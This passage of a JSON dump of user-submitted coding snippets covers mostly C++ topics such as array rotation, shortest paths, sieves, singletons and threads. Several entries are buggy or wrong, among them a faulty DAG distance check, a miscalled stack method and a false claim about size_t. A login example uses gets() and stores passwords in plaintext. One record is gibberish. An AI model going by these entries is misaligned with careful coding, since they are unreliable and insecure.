    "description": "\t// Shift array elements to right \tconst int SIZE = 9; \tint arr[SIZE]={1,2,3,4,5,6,7,8,9};  \tint last = arr[SIZE - 1];\t\t \tfor (int i = SIZE - 1; i > 0; i--)\t \t\tarr[i] = arr[i - 1];\t\t \t \tarr[0] = last;\n# include <iostream>  using namespace std;   void rotate(int arr[], int n)  {  \tint last = arr[n - 1], i;  \tfor (i = n - 1; i > 0; i--)  \tarr[i] = arr[i - 1];  \tarr[0] = last;  }    int main()  {  \tint arr[100], i;  \tint n, turns;  \tcin >> n;  \tfor(i=0;i<n;i++){ \t\tscanf(\"%d\", &arr[i]); \t}      \tcin >> turns;  \twhile(turns>=1){ \t\trotate(arr,n); \t\tturns--; \t}  \tfor(i=0;i<n;i++){ \t\tcout << arr[i] << \" \"; \t}  \treturn 0;  }   \n\tint temp=arr[0]; \t/********************************\tMethod 1 \tfor (int i = 0; i < SIZE - 1; i++)\t\t \t{ \t\tarr[i] = arr[i + 1]; \t} \tarr[SIZE-1]=temp; \t*/ \t//\t\t\t\t\t\t\t\t\tMethod 2 \tfor (int i = 1; i < SIZE - 1; i++) \t{ \t\tarr[i - 1] = arr[i]; \t} \tarr[SIZE - 1] = temp; \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl; \n",
    "reg_date": "2021-10-12T11:43:17.000Z"
  },
  {
    "id": 3667,
    "keyword": null,
    "link": null,
    "title": " shift element to end of vector c++",
    "description": "template <typename t> void move(std::vector<t>& v, size_t oldIndex, size_t newIndex) {     if (oldIndex > newIndex)         std::rotate(v.rend() - oldIndex - 1, v.rend() - oldIndex, v.rend() - newIndex);     else                 std::rotate(v.begin() + oldIndex, v.begin() + oldIndex + 1, v.begin() + newIndex + 1); }  auto initial_pos = 1; auto final_pos = 4; move(some_vector, initial_pos, final_pos);\n",
    "reg_date": "2021-10-12T11:43:17.000Z"
  },
  {
    "id": 3668,
    "keyword": null,
    "link": null,
    "title": " shortcut comment visual studio",
    "description": "Comment Code Block Ctrl+K+C/Ctrl+K+U If you select a block of code and use the key sequence Ctrl+K+C, you'll comment out the section of code. Ctrl+K+U will uncomment the code.\nNew empty HTML comment wherever:  Shift + Alt + A\nIn Visual Studio: Ctrl+K+C will comment, Ctrl+K+U Will uncomment\n",
    "reg_date": "2021-10-12T11:43:17.000Z"
  },
  {
    "id": 3669,
    "keyword": null,
    "link": null,
    "title": " shorten if condition c++",
    "description": "(condition) ? (if_true) : (if_false) \n",
    "reg_date": "2021-10-12T11:43:17.000Z"
  },
  {
    "id": 3670,
    "keyword": null,
    "link": null,
    "title": " shortest path algorithm in a DAG",
    "description": "//Shortest path in DAG #include<bits/stdc++.h> using namespace std; void addedge(vector<pair<int,int>>adj[],int u,int v,int weight) {     adj[u].push_back(make_pair(v,weight)); } void topo(int node,vector<pair<int,int>>adj[],int visited[],stack<int>&st) {     visited[node]=1;     for(auto it:adj[node])     {         if(!visited[it.first])         {             topo(it.first,adj,visited,st);         }     }     st.push(node); } void shortestpath(vector<pair<int,int>>adj[],int source,int n) {     int vist[n]={0};     stack<int>st;     for(int i=0;i<n;i++)     {         if(!vist[i])         {             topo(i,adj,vist,st);         }     }     int dist[n];     for(int i=0;i<n;i++)     {         dist[i]=INT_MAX;     }     dist[source]=0;     while(!st.empty())     {         int node=st.top();         st.pop();         if(dist[node!=INT_MAX])         {             for(auto it: adj[node])             {                 if(dist[node]+it.second<dist[it.first])                 {                     dist[it.first]=dist[node]+it.second;                 }             }         }     }     for(int i=0;i<n;i++)     {         if(dist[i]==INT_MAX)         {             cout<<\"imf\"<<\" \";         }         else         {             cout<<dist[i]<<\" \";         }     } } int main() {     int vertex,edges;     cout<<\"ENTER THE NUMBER OF VERTEX AND EDGES:\"<<endl;     cin>>vertex>>edges;     vector<pair<int,int>>adj[vertex];     int a,b,w;     cout<<\"ENTER THE LINKS:\"<<endl;     for(int i=0;i<edges;i++)     {         cin>>a>>b>>w;         addedge(adj,a,b,w);     }     int src;     cout<<\"ENTER THE NODE FROM WHICH SHORTEST PATH IS MEANT TO BE FOUND:\"<<endl;     cin>>src;     shortestpath(adj,src,vertex);     return 0; } \n",
    "reg_date": "2021-10-12T11:43:18.000Z"
  },
  {
    "id": 3671,
    "keyword": null,
    "link": null,
    "title": " shortest path algorithm with unit weight",
    "description": "//Shortest Path in Undirected graph using Unit weight BFS //Check the striver graph series #include<bits/stdc++.h> using namespace std; void addedge(vector<int>adj[],int u,int v) {     adj[u].push_back(v);     adj[v].push_back(u); } void shortest(vector<int>adj[],int n , int source) {     int distance[n];     for(int i=0;i<n;i++)     {         distance[i]=INT_MAX;     }     queue<int>q;     distance[source]=0;     q.push(source);     while(!q.empty())     {         int node=q.front();         q.pop();         for(auto j:adj[node])         {             if(distance[node]+1<distance[j])             {                 distance[j]=distance[node]+1;                 q.push(j);             }         }     }     for(int i=0;i<n;i++)     {         cout<<distance[i]<<\" \";     } } int main() {     int vertex,edges;     cout<<\"Enter the number of vertex and edges:\"<<endl;     cin>>vertex>>edges;     vector<int>adj[vertex];     int a,b;     cout<<\"Enter the links:\"<<endl;     for(int i=0;i<edges;i++)     {         cin>>a>>b;         addedge(adj,a,b);     }     int value;     cout<<\"Enter the node from which you want to calculate the shortest distance:\"<<endl;     cin>>value;     shortest(adj,vertex,value);     return 0; } \n",
    "reg_date": "2021-10-12T11:43:18.000Z"
  },
  {
    "id": 3672,
    "keyword": null,
    "link": null,
    "title": " should i learn c or c++",
    "description": "A guide for beginners to learn. If it helpful, upvote me! Thanks ~~  #Tutorial https://www.learncpp.com/ https://www.w3schools.com/cpp/ https://docs.microsoft.com/en-us/cpp/cpp/ https://www.cplusplus.com/ https://en.cppreference.com/w/ https://www.freecodecamp.org/ https://www.cprogramming.com/ https://devdocs.io/cpp/ https://beginnersbook.com/ https://codescracker.com/cpp/index.htm https://www.techiedelight.com/ CppCon  #Course https://www.tutorialspoint.com/ https://www.coursera.org/ https://www.udemy.com/ https://www.codecademy.com/ https://www.udacity.com/ Youtube  #Practice https://www.hackerrank.com/ https://leetcode.com/ https://www.codewars.com/ https://codeforces.com/ https://www.topcoder.com/ https://www.codingame.com/ https://www.coderbyte.com/ https://projecteuler.net/ https://exercism.io/  #IDE https://www.onlinegdb.com/ https://www.programiz.com/cpp-programming/online-compiler/ https://www.codechef.com/ide https://coliru.stacked-crooked.com/\nBefore learning c++ I would recomend learning c or c#. If that is to hard then go with the good old simple python\n",
    "reg_date": "2021-10-12T11:43:18.000Z"
  },
  {
    "id": 3673,
    "keyword": null,
    "link": null,
    "title": " shout sharkest",
    "description": "Shout is social media platform made like facebook: link https://shout.tribe.so/\n",
    "reg_date": "2021-10-12T11:43:18.000Z"
  },
  {
    "id": 3674,
    "keyword": null,
    "link": null,
    "title": " show a 2d vector in c++",
    "description": "// A recursive function able to print a vector // of an arbitrary amount of dimensions. template<typename T> static void show(T vec) {   std::cout << vec; }   template<typename T> static void show(std::vector<T> vec) {   int size = vec.size();   if (size <= 0) {     std::cout << \"invalid vector\";     return;   }   std::cout << '{';   for (int l = 0; l < size - 1; l++) {     show(vec[l]);     std::cout << ',';   }   show(vec[size - 1]);   std::cout << '}'; }\n",
    "reg_date": "2021-10-12T11:43:18.000Z"
  },
  {
    "id": 3675,
    "keyword": null,
    "link": null,
    "title": " show a 3d vector in c++",
    "description": "// A recursive function able to print a vector // of an arbitrary amount of dimensions. template<typename T> static void show(T vec) {   std::cout << vec; }   template<typename T> static void show(std::vector<T> vec) {   int size = vec.size();   if (size <= 0) {     std::cout << \"invalid vector\";     return;   }   std::cout << '{';   for (int l = 0; l < size - 1; l++) {     show(vec[l]);     std::cout << ',';   }   show(vec[size - 1]);   std::cout << '}'; }\n",
    "reg_date": "2021-10-12T11:43:18.000Z"
  },
  {
    "id": 3676,
    "keyword": null,
    "link": null,
    "title": " show a 4d vector in c++",
    "description": "// A recursive function able to print a vector // of an arbitrary amount of dimensions. template<typename T> static void show(T vec) {   std::cout << vec; }   template<typename T> static void show(std::vector<T> vec) {   int size = vec.size();   if (size <= 0) {     std::cout << \"invalid vector\";     return;   }   std::cout << '{';   for (int l = 0; l < size - 1; l++) {     show(vec[l]);     std::cout << ',';   }   show(vec[size - 1]);   std::cout << '}'; }\n",
    "reg_date": "2021-10-12T11:43:18.000Z"
  },
  {
    "id": 3677,
    "keyword": null,
    "link": null,
    "title": " show a multi dimension vector in c++",
    "description": "// A recursive function able to print a vector // of an arbitrary amount of dimensions. template<typename T> static void show(T vec) {   std::cout << vec; }   template<typename T> static void show(std::vector<T> vec) {   int size = vec.size();   if (size <= 0) {     std::cout << \"invalid vector\";     return;   }   std::cout << '{';   for (int l = 0; l < size - 1; l++) {     show(vec[l]);     std::cout << ',';   }   show(vec[size - 1]);   std::cout << '}'; }\n",
    "reg_date": "2021-10-12T11:43:18.000Z"
  },
  {
    "id": 3678,
    "keyword": null,
    "link": null,
    "title": " show a vector in c++",
    "description": "// A recursive function able to print a vector // of an arbitrary amount of dimensions. template<typename T> static void show(T vec) {   std::cout << vec; }   template<typename T> static void show(std::vector<T> vec) {   int size = vec.size();   if (size <= 0) {     std::cout << \"invalid vector\";     return;   }   std::cout << '{';   for (int l = 0; l < size - 1; l++) {     show(vec[l]);     std::cout << ',';   }   show(vec[size - 1]);   std::cout << '}'; }\n",
    "reg_date": "2021-10-12T11:43:18.000Z"
  },
  {
    "id": 3679,
    "keyword": null,
    "link": null,
    "title": " show mouse c++",
    "description": "while (ShowCursor(TRUE) < 0); //Show mouse while (ShowCursor(FALSE) < 0); //Hide mouse\n",
    "reg_date": "2021-10-12T11:43:18.000Z"
  },
  {
    "id": 3680,
    "keyword": null,
    "link": null,
    "title": " show stack c++",
    "description": "stack<int> stk; stk.push(5); int ans = stk.top(5); // ans =5 stk.pop();//removes 5\nvoid showstack(stack<int> s) { \twhile(!s.empty()) { \t\tcout<< s.top()<<\" \"; \t\ts.pop(); \t} \tcout<<endl; }\n",
    "reg_date": "2021-10-12T11:43:19.000Z"
  },
  {
    "id": 3681,
    "keyword": null,
    "link": null,
    "title": " shrek c++",
    "description": "Wow Your A Idiot\n",
    "reg_date": "2021-10-12T11:43:19.000Z"
  },
  {
    "id": 3682,
    "keyword": null,
    "link": null,
    "title": " shuffle elements c++",
    "description": "random_shuffle(v.begin(), v.end());\n",
    "reg_date": "2021-10-12T11:43:19.000Z"
  },
  {
    "id": 3683,
    "keyword": null,
    "link": null,
    "title": " shuffle vector c++",
    "description": "std::shuffle(container.begin(), container.end(), std::random_device());\n",
    "reg_date": "2021-10-12T11:43:19.000Z"
  },
  {
    "id": 3684,
    "keyword": null,
    "link": null,
    "title": " sideways triangle c++ xy plane",
    "description": "***** **** *** ** * \n#include<bits/stdc++.h> using namespace std; int main() { \tint n; \tcin>>n; \tfor(int i=n;i>=1;i--) \t{ \t\tfor(int j=1;j<=i;j++){ \t\t\tcout<<\"*\"; \t\t} \t\tcout<<endl; \t} \treturn 0; }\n",
    "reg_date": "2021-10-12T11:43:19.000Z"
  },
  {
    "id": 3685,
    "keyword": null,
    "link": null,
    "title": " sieve of eratosthenes c++",
    "description": "//sieve of eratosthenes or prime of sieve #include<iostream> #include<math.h> using namespace std; void primeofsieve(long long int n) { \tlong long int arr[n]={}; \tfor(int i=2;i<=sqrt(n);i++) \t{ \t\tfor(long long int j=i*i;j<=n;j+=i) \t\t\tarr[j]=1; \t} \tfor(long long int i=2;i<=n;i++) \t{ \t    if(arr[i]==0) \t    \tcout<<i<<\" \"; \t}   } int main() {  \t#ifdef _DEBUG \tfreopen(\"input.txt\", \"r\", stdin); \tfreopen(\"output.txt\", \"w\", stdout);     #endif \tlong long int n; \tcin>>n; \tcout<<\"PRIME NUMBERs ARE : \"; \tprimeofsieve(n); \treturn 0; }\nint n; vector<bool> is_prime(n+1, true); is_prime[0] = is_prime[1] = false; for (int i = 2; i <= n; i++) {     if (is_prime[i] && (long long)i * i <= n) {         for (int j = i * i; j <= n; j += i)             is_prime[j] = false;     } } \n// C++ program to print all primes smaller than or equal to  // n using Sieve of Eratosthenes  #include <bits/stdc++.h>  using namespace std;   void SieveOfEratosthenes(int n)  {  \t// Create a boolean array \"prime[0..n]\" and initialize  \t// all entries it as true. A value in prime[i] will  \t// finally be false if i is Not a prime, else true.  \tbool prime[n+1];  \tmemset(prime, true, sizeof(prime));   \tfor (int p=2; p*p<=n; p++)  \t{  \t\t// If prime[p] is not changed, then it is a prime  \t\tif (prime[p] == true)  \t\t{  \t\t\t// Update all multiples of p greater than or  \t\t\t// equal to the square of it  \t\t\t// numbers which are multiple of p and are  \t\t\t// less than p^2 are already been marked.  \t\t\tfor (int i=p*p; i<=n; i += p)  \t\t\t\tprime[i] = false;  \t\t}  \t}   \t// Print all prime numbers  \tfor (int p=2; p<=n; p++)  \tif (prime[p])  \t\tcout << p << \" \";  }   // Driver Program to test above function  int main()  {  \tint n = 30;  \tcout << \"Following are the prime numbers smaller \" \t\t<< \" than or equal to \" << n << endl;  \tSieveOfEratosthenes(n);  \treturn 0;  }  \nint n; vector<char> is_prime(n+1, true); is_prime[0] = is_prime[1] = false; for (int i = 2; i <= n; i++) {     if (is_prime[i] && (long long)i * i <= n) {         for (int j = i * i; j <= n; j += i)             is_prime[j] = false;     } } \n#include <iostream> const int len = 30; int main() {    int arr[30] = {0};    for (int i = 2; i < 30; i++) {       for (int j = i * i; j < 30; j+=i) {          arr[j - 1] = 1;       }    }    for (int i = 1; i < 30; i++) {       if (arr[i - 1] == 0)          std::cout << i << \"\\t\";    } }\n",
    "reg_date": "2021-10-12T11:43:19.000Z"
  },
  {
    "id": 3686,
    "keyword": null,
    "link": null,
    "title": " sieve of eratosthenes c++ code",
    "description": "int n; vector<bool> is_prime(n+1, true); is_prime[0] = is_prime[1] = false; for (int i = 2; i <= n; i++) {     if (is_prime[i] && (long long)i * i <= n) {         for (int j = i * i; j <= n; j += i)             is_prime[j] = false;     } } \n// C++ program to print all primes smaller than or equal to  // n using Sieve of Eratosthenes  #include <bits/stdc++.h>  using namespace std;   void SieveOfEratosthenes(int n)  {  \t// Create a boolean array \"prime[0..n]\" and initialize  \t// all entries it as true. A value in prime[i] will  \t// finally be false if i is Not a prime, else true.  \tbool prime[n+1];  \tmemset(prime, true, sizeof(prime));   \tfor (int p=2; p*p<=n; p++)  \t{  \t\t// If prime[p] is not changed, then it is a prime  \t\tif (prime[p] == true)  \t\t{  \t\t\t// Update all multiples of p greater than or  \t\t\t// equal to the square of it  \t\t\t// numbers which are multiple of p and are  \t\t\t// less than p^2 are already been marked.  \t\t\tfor (int i=p*p; i<=n; i += p)  \t\t\t\tprime[i] = false;  \t\t}  \t}   \t// Print all prime numbers  \tfor (int p=2; p<=n; p++)  \tif (prime[p])  \t\tcout << p << \" \";  }   // Driver Program to test above function  int main()  {  \tint n = 30;  \tcout << \"Following are the prime numbers smaller \" \t\t<< \" than or equal to \" << n << endl;  \tSieveOfEratosthenes(n);  \treturn 0;  }  \nint n; vector<char> is_prime(n+1, true); is_prime[0] = is_prime[1] = false; for (int i = 2; i <= n; i++) {     if (is_prime[i] && (long long)i * i <= n) {         for (int j = i * i; j <= n; j += i)             is_prime[j] = false;     } } \n#include <iostream> const int len = 30; int main() {    int arr[30] = {0};    for (int i = 2; i < 30; i++) {       for (int j = i * i; j < 30; j+=i) {          arr[j - 1] = 1;       }    }    for (int i = 1; i < 30; i++) {       if (arr[i - 1] == 0)          std::cout << i << \"\\t\";    } }\n",
    "reg_date": "2021-10-12T11:43:19.000Z"
  },
  {
    "id": 3687,
    "keyword": null,
    "link": null,
    "title": " sieve of eresthossis cp c++",
    "description": "int n; vector<char> is_prime(n+1, true); is_prime[0] = is_prime[1] = false; for (int i = 2; i <= n; i++) {     if (is_prime[i] && (long long)i * i <= n) {         for (int j = i * i; j <= n; j += i)             is_prime[j] = false;     } } \n",
    "reg_date": "2021-10-12T11:43:19.000Z"
  },
  {
    "id": 3688,
    "keyword": null,
    "link": null,
    "title": " simple gtk application",
    "description": "#include <gtk/gtk.h>  static void activate (GtkApplication* app,           gpointer        user_data) {   GtkWidget *window;    window = gtk_application_window_new (app);   gtk_window_set_title (GTK_WINDOW (window), \"Window\");   gtk_window_set_default_size (GTK_WINDOW (window), 200, 200);   gtk_widget_show_all (window); }  int main (int    argc,       char **argv) {   GtkApplication *app;   int status;    app = gtk_application_new (\"org.gtk.example\", G_APPLICATION_FLAGS_NONE);   g_signal_connect (app, \"activate\", G_CALLBACK (activate), NULL);   status = g_application_run (G_APPLICATION (app), argc, argv);   g_object_unref (app);    return status; } \n",
    "reg_date": "2021-10-12T11:43:19.000Z"
  },
  {
    "id": 3689,
    "keyword": null,
    "link": null,
    "title": " simple multithreaded hello world",
    "description": "use std::thread; use std::time::Duration;  fn main() {     // Create a new thread     let handle = thread::spawn(|| {         for i in 1..10 {             println!(\"Hello World! {}. Printing from spawned thread\", i);             thread:: sleep(Duration::from_millis(1));          }     });      // Main thread     for i in 1..10 {         println!(\"Hello World! {} from the main thread\", i);         thread::sleep(Duration::from_millis(2));     }      // Hold the main thread until the spawned thread has completed     handle.join().unwrap(); }\n#include <unistd.h>   #include <pthread.h>  // A C function that is executed as a thread // when its name is specified in pthread_create() void *myThreadFun(void *vargp) {     for (int i = 0; i < 10; i++) {         printf(\"Hello World! %d Printing from spawned thread\\n\", i);         sleep(1);     }     return NULL; }  int main() {     // Create a new thread     pthread_t thread_id;     pthread_create(&thread_id, NULL, myThreadFun, NULL);      // Main thread     for (int i = 0; i < 10; i++) {         printf(\"Hello World! %d from the main thread\\n\", i);         sleep(2);     }     pthread_join(thread_id, NULL);     exit(0); }\npackage main  import (     \"fmt\"     \"time\" )  func main() {     // Create a new thread     go func() {         for i := 1; i < 10; i++ {             fmt.Printf(\"Hello World! %d. Printing from spawned thread\\n\", i);             time.Sleep(1 * time.Millisecond)         }             }()      // Main thread         for i := 1; i < 10; i++ {         time.Sleep(2 * time.Millisecond)         fmt.Printf(\"Hello World! %d from the main thread\\n\", i)         } }\n#include <iostream> #include <thread> #include <chrono>  using namespace std;  int main() {     // Create a new thread     auto f = [](int x) {         for (int i = 0; i < x; i++) {             cout << \"Hello World! \" << i << \" Printing from spawned thread\" << endl;             std::this_thread::sleep_for(std::chrono::milliseconds(500));         }     };     thread th1(f, 10);      // Main thread      for (int i = 0; i < 10; i++) {         cout << \"Hello World! \" << i << \" from the main thread\" << endl;         std::this_thread::sleep_for(std::chrono::milliseconds(1000));     }     // Wait for thread th1 to finish     th1.join();     return 0; }\n",
    "reg_date": "2021-10-12T11:43:19.000Z"
  },
  {
    "id": 3690,
    "keyword": null,
    "link": null,
    "title": " simple password program c++ source code",
    "description": "#include <iostream> using namespace std;  int main () {     string userName;     string userPassword;     int loginAttempt = 0;      while (loginAttempt < 5)     {         cout << \"Please enter your user name: \";         cin >> userName;         cout << \"Please enter your user password: \";         cin >> userPassword;          if (userName == \"greg\" && userPassword == \"dunn\")         {             cout << \"Welcome Greg!\\n\";             break;         }         else if (userName == \"patrick\" && userPassword == \"dunn\")         {             cout << \"Welcome Patrick!\\n\";             break;         }         else         {             cout << \"Invalid login attempt. Please try again.\\n\" << '\\n';             loginAttempt++;         }     }     if (loginAttempt == 5)     {             cout << \"Too many login attempts! The program will now terminate.\";             return 0;     }      cout << \"Thank you for logging in.\\n\"; }\n",
    "reg_date": "2021-10-12T11:43:20.000Z"
  },
  {
    "id": 3691,
    "keyword": null,
    "link": null,
    "title": " simple program for sign in and sign up in c++",
    "description": "    #include<iostream.h>     #include<fstream.h>     #include<conio.h>     #include<stdio.h>     #include<string.h>      void register_user();     void login_user();     void main_menu();      int IsLoggedIn()     {         char username[20],password[20],un[20],pw[20];         cout<<\"Enter Username: \";gets(username);         cout<<\"Enter Password: \";gets(password);          ifstream read(username + \".txt\");         getline(un,read);         getline(pw,read);          if(un==username && pw==password)         {             return 1;         }         else         {             return 0;         }     }      void main()     {         main_menu();     }      void main_menu()     {         int choice;         cout<<\"1. Register\\n2. Login\\nYour Choice: \"; cin>>choice;         switch(choice)         {             case 1: register_user(); break;             case 2: login_user(); break;             default: break;         }     }      void register_user()     {         char username[20], password1[20],password2[20];         cout<<\"Enter Username: \";gets(username);         rev1:cout<<\"Enter Password: \";gets(password1);         cout<<\"Enter Password again: \";gets(password2);         while (password1!=password2)         {             goto rev1;         }         ofstream file;         file.open(username + \".txt\");         file<<username<<endl<<password1;         file.close();     }      void login_user()     {         int chk=IsLoggedIn();         if(chk==1)         {             cout<<\"Log in successfull!\\n\";         }         else         {             cout<<\"Log in unsucessfull!\\n\";         }     } \n",
    "reg_date": "2021-10-12T11:43:20.000Z"
  },
  {
    "id": 3692,
    "keyword": null,
    "link": null,
    "title": " simple timer arduino blynk library error",
    "description": "BlynkTimer timer;\n",
    "reg_date": "2021-10-12T11:43:20.000Z"
  },
  {
    "id": 3693,
    "keyword": null,
    "link": null,
    "title": " sine function in cpp",
    "description": "/* sin example */ #include <stdio.h>      /* printf */ #include <math.h>       /* sin */  #define PI 3.14159265  int main () {   double param, result;   param = 30.0;   result = sin (param*PI/180);   printf (\"The sine of %f degrees is %f.\\n\", param, result );   return 0; }\n",
    "reg_date": "2021-10-12T11:43:21.000Z"
  },
  {
    "id": 3694,
    "keyword": null,
    "link": null,
    "title": " single line if c++",
    "description": "a = (x > y) ? z : y;  /* Same as */  if (x > y) {     a = z; } else {     a = y; }\nx = condition ? expression1 : expression2  // Example: double x = (1 > 0) ? 10 : 20; // put any value\n",
    "reg_date": "2021-10-12T11:43:21.000Z"
  },
  {
    "id": 3695,
    "keyword": null,
    "link": null,
    "title": " singleton c++",
    "description": "class S {     public:         static S& getInstance()         {             static S    instance; // Guaranteed to be destroyed.                                   // Instantiated on first use.             return instance;         }     private:         S() {}                    // Constructor? (the {} brackets) are needed here.          // C++ 03         // ========         // Don't forget to declare these two. You want to make sure they         // are unacceptable otherwise you may accidentally get copies of         // your singleton appearing.         S(S const&);              // Don't Implement         void operator=(S const&); // Don't implement          // C++ 11         // =======         // We can use the better technique of deleting the methods         // we don't want.     public:         S(S const&)               = delete;         void operator=(S const&)  = delete;          // Note: Scott Meyers mentions in his Effective Modern         //       C++ book, that deleted functions should generally         //       be public as it results in better error messages         //       due to the compilers behavior to check accessibility         //       before deleted status };\n#include <iostream>  using namespace std;  class Singleton {    static Singleton *instance;    int data;      // Private constructor so that no objects can be created.    Singleton() {       data = 0;    }     public:    static Singleton *getInstance() {       if (!instance)       instance = new Singleton;       return instance;    }     int getData() {       return this -> data;    }     void setData(int data) {       this -> data = data;    } };  //Initialize pointer to zero so that it can be initialized in first call to getInstance Singleton *Singleton::instance = 0;  int main(){    Singleton *s = s->getInstance();    cout << s->getData() << endl;    s->setData(100);    cout << s->getData() << endl;    return 0; }\n",
    "reg_date": "2021-10-12T11:43:21.000Z"
  },
  {
    "id": 3696,
    "keyword": null,
    "link": null,
    "title": " sinh hoan vi c++",
    "description": "OK = false ; while(!OK) { \tin(); \tint t = n-1; \twhile(a[t] > a[t+1]) t--; \tif(t) { \t\tint i = n; \t\twhile(a[i] < a[t]) i--; \t\tswap(a[i],a[t]); \t\tint l = t+1, r= n; \t\twhile(l<r) { \t\t\tswap(a[l],a[r]); \t\t\tl++; r--; \t\t} \t} else OK = true; }\n",
    "reg_date": "2021-10-12T11:43:21.000Z"
  },
  {
    "id": 3697,
    "keyword": null,
    "link": null,
    "title": " sinh nhi phan c++",
    "description": "OK = false; while (!OK) { \tin(); \ti = n; \twhile (a[i] == '1') a[i--] = '0'; \tif (i==0) OK = true; \telse { \t\ta[i] = '1'; \t} }\n",
    "reg_date": "2021-10-12T11:43:21.000Z"
  },
  {
    "id": 3698,
    "keyword": null,
    "link": null,
    "title": " sinh to hop c++",
    "description": "OK = false ; while(!OK) { \tin(); \tint t = k; \twhile(a[t] == n + t - k) t--; \tif(t>0) { \t\ta[t]++; \t\tfor(int i = t+1; i<= k ; i++) { \t\t\ta[i] = a[i-1] +1; \t\t} \t} else OK = true; }\t\n",
    "reg_date": "2021-10-12T11:43:21.000Z"
  },
  {
    "id": 3699,
    "keyword": null,
    "link": null,
    "title": " sinonimo de tratar",
    "description": "printf(\"Escola\")     \n",
    "reg_date": "2021-10-12T11:43:21.000Z"
  },
  {
    "id": 3700,
    "keyword": null,
    "link": null,
    "title": " size of a matrix c++",
    "description": "std::vector< std::vector<int> > my_array; /* 2D Array */  my_array.size(); /* size of y */ my_array[0].size(); /* size of x */\n",
    "reg_date": "2021-10-12T11:43:21.000Z"
  },
  {
    "id": 3701,
    "keyword": null,
    "link": null,
    "title": " size of a matrix using vector c++",
    "description": "// finding size of a square matrix myVector[0].size();\n#include <bits/stdc++.h> using namespace std; int main()  {   int rows = 2;   int cols = 2;   int val = 1;   vector< vector<int> > v(rows, vector<int> (cols, val));  /*creates 2d vector &ldquo;v[rows][cols]&rdquo; and initializes all elements to &ldquo;val == 1&rdquo; (default value is 0)*/   v[0][0] = 5;   v[1][1] = 4;   cout << v[0][0] << endl; //Output: 5cout << v[1][0] << endl; //Output: 1return 0;}\n",
    "reg_date": "2021-10-12T11:43:21.000Z"
  },
  {
    "id": 3702,
    "keyword": null,
    "link": null,
    "title": " size of map c++",
    "description": "map_name.size()\n",
    "reg_date": "2021-10-12T11:43:22.000Z"
  },
  {
    "id": 3703,
    "keyword": null,
    "link": null,
    "title": " size of map with no elements",
    "description": "#include <iostream> #include <utility> #include <map>  using namespace std;  int main(void) {     map<int, int> m;     cout << m.size(); }  //Output: 0\nmap_name.size()\n",
    "reg_date": "2021-10-12T11:43:22.000Z"
  },
  {
    "id": 3704,
    "keyword": null,
    "link": null,
    "title": " size of stack in c++",
    "description": "std::stack<int> st;  std::cout << \"size of stack: \" << st.size();\nstd::stack <int> st; if(st.empty())   std::cout << \"stack is empty\";\n",
    "reg_date": "2021-10-12T11:43:22.000Z"
  },
  {
    "id": 3705,
    "keyword": null,
    "link": null,
    "title": " size t c++",
    "description": "// size_t is a type definition for unsigned long long // This means that writing size_t is the excact same as // writing unsigned long long\nAlias of one of the fundamental unsigned integer types. It represents the size of any object in bytes and returned by sizeof operator. It is used for array indexing and counting. It can never be negative.\n",
    "reg_date": "2021-10-12T11:43:22.000Z"
  },
  {
    "id": 3706,
    "keyword": null,
    "link": null,
    "title": " sizeof’ on array function parameter ‘arr’ will return size of ‘int*’ [-Wsizeof-array-argument]",
    "description": "There is no way to determine the length inside the function. However you pass arr, sizeof(arr) will always return the pointer size. So the best way is to pass the number of elements as a separate argument. sizeof only works to find the length of the array if you apply it to the original array.  int arr[5]; //real array. NOT a pointer sizeof(arr); // :) However, by the time the array decays into a pointer, sizeof will give the  size of the pointer and not of the array.  void getArraySize(int arr[]){ sizeof(arr); // will give the pointer size } There is some reasoning as to why this would take place. How could we make things so that a C array also knows its length? A first idea would be not having arrays decaying into pointers when they are passed to a function and continuing to keep  the array length in the type system. When you pass an array to a function it decays to pointer. So the sizeof function will return the size of int *. This is the warning that your compiler complining about  \n",
    "reg_date": "2021-10-12T11:43:22.000Z"
  },
  {
    "id": 3707,
    "keyword": null,
    "link": null,
    "title": " sizeof",
    "description": "cout << \"char: \" << sizeof(char) << endl; cout << \"int: \" << sizeof(int) << endl; cout << \"float: \" << sizeof(float) << endl; cout << \"double: \" << sizeof(double) << endl;\n",
    "reg_date": "2021-10-12T11:43:22.000Z"
  },
  {
    "id": 3708,
    "keyword": null,
    "link": null,
    "title": " sizeof operator",
    "description": "cout << \"char: \" << sizeof(char) << endl; cout << \"int: \" << sizeof(int) << endl; cout << \"float: \" << sizeof(float) << endl; cout << \"double: \" << sizeof(double) << endl;\n",
    "reg_date": "2021-10-12T11:43:22.000Z"
  },
  {
    "id": 3709,
    "keyword": null,
    "link": null,
    "title": " sizeof operator in c++",
    "description": "cout << \"char: \" << sizeof(char) << endl; cout << \"int: \" << sizeof(int) << endl; cout << \"float: \" << sizeof(float) << endl; cout << \"double: \" << sizeof(double) << endl;\n",
    "reg_date": "2021-10-12T11:43:22.000Z"
  },
  {
    "id": 3710,
    "keyword": null,
    "link": null,
    "title": " sjfoajf;klsjflasdkfjk;lasjfjajkf;dslafjdjalkkkjakkkkkkkkkkkkkkkkfaWZdfbhjkkkk gauds",
    "description": "wjkjnbv ndmkdmcn mskdcnncmksncbndksdjncjskjdnbvfndejjnf fndkdnfvbndjnfbvnmkcmvnvzv;lkcjjjlaksjflskjf;askj;slakdfjlskdaf;jlsadjfffffffffffffffffffffffooooooooooooccccccccckkkkkkkkkkkkkkkoca;lkjhxzzzzzzzzzzzzzzzzzzzzzzzzzzzzzdgszfyuio[\\];oihjfsoahfposiadhfpouashfs\n",
    "reg_date": "2021-10-12T11:43:22.000Z"
  },
  {
    "id": 3711,
    "keyword": null,
    "link": null,
    "title": " skip headers while reading text",
    "description": "#include<sstream> ...  ... std::ifstream file {\"test.txt\"}; std::string word, line; std::istringstream iss; double var, tab[100][6]; int i=0, j; ...  while(getline(file, line)) {   if (!(line[0]=='#'))   {     iss.str(line);          j = 0;      while(iss >> var)     {       tab[i][j] = var;       ++j;     }          iss.clear();      ++i;   } }  file.close(); \n",
    "reg_date": "2021-10-12T11:43:22.000Z"
  },
  {
    "id": 3712,
    "keyword": null,
    "link": null,
    "title": " sleep c++",
